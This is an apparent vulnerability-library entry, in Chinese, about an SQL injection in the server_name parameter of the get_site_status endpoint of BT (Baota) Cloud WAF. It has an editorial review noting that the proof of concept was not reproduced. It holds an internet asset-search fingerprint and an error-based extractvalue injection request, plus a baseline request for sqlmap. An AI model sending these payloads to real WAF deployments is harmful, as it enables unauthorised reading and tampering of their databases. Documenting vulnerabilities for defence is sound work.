---
source: "wy876 漏洞文库"
id: "vw-3809aba8b915e5811896cb1f"
entity_id: "ve-3809aba8b915e5811896cb1f"
schema_version: "1"
title: "宝塔云WAF server_name存在SQL注入漏洞"
product: "堡塔/宝塔云WAF"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无认证头，MySQL extractvalue函数可用；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%AE%9D%E5%A1%94%E4%BA%91WAF/%E5%AE%9D%E5%A1%94%E4%BA%91WAFserver_name%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ck7t8ensptmf97se"
source_status: "recorded"
---

# 宝塔云WAF server_name存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：堡塔/宝塔云WAF
- 本文讨论：get_site_status server_name SQL注入
- 版本、权限与配置前提：无认证头，MySQL extractvalue函数可用；版本未知
- 资料类型：WAF状态接口SQL请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题server_name是参数非接口，应标get_site_status
- 无报错响应或布尔对照，添加/删数据等影响未证明权限
- 404通用标题指纹过宽；开源断言缺仓库出处
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 数据库实现、匿名访问和官方补丁待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
免费的私有云WAF防火墙 堡塔云WAF经过千万级用户认证、为您的业务保驾护航 采用反向代理的方式,网站流量先抵达堡塔云WAF 经过堡塔云WAF检测和过滤后，再转给原来提供服务的网站服务器。堡塔云WAF是一个开源的Web应用程序防火墙，它可以保护网站免受SQL注入，XSS，CSRF，SSRF，命令注入，代码注入，本地文件包含，远程文件包含等攻击 兼容ARM和国产系统。堡塔云WAF server_name 接口处存在SQL注入漏洞,恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

# 二、影响版本
+ 堡塔云WAF

# 三、资产测绘
```plain
title=="404 - Website not exist!"
```


# 四、漏洞复现
```http
GET /get_site_status?server_name='-extractvalue(1,concat(0x5c,123456789))-'1 HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


sqlmap:

```http
GET /get_site_status?server_name=1 HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ck7t8ensptmf97se>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
